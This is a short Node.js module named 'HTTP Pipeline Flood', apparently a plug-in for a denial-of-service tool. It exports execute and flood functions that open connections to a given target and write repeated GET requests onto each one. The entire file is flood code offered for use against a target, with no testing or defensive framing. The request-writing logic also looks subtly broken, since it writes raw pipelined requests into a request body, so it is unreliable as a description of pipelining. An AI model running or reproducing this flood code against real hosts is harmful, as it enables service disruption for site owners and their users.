const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP Pipeline Flood',
    description: 'HTTP request pipelining',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/',
                method: 'GET'
            }, (res) => {
                resolve({ status: res.statusCode });
                req.destroy();
            });
            
            // Send multiple requests on same connection
            for (let i = 0; i < 10; i++) {
                req.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
            }
            
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            method: 'GET'
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        for (let i = 0; i < 5; i++) {
            req.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
        }
        
        req.end();
        req.on('error', () => callback(false));
    }
};